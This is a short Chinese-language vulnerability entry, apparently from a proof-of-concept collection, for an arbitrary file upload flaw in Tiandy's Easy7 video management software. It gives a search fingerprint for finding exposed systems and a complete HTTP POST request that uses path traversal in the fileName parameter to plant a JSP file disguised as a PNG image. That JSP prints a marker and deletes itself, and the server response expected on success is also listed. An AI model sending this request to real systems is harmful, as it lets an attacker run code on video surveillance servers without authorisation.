# 天地伟业Easy7uploadFile存在任意文件上传漏洞

- **系统**：天地伟业　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`POST /Easy7/rest/file/uploadFile?fileName=../../apache-tomcat-7.0.78/webapps/Easy7/DudeSuite HTTP/1.1`
- **关键头**：`Priority: u=1`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarys6NZxpQO…`

**请求体 / payload**
```
------WebKitFormBoundarys6NZxpQOUidCIuxI
Content-Disposition: form-data; name="file"; filename="test123.jsp"
Content-Type: image/png
<% out.println("test123"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundarys6NZxpQOUidCIuxI--
```
- **预期**：200　|　/Easy7/test123.jsp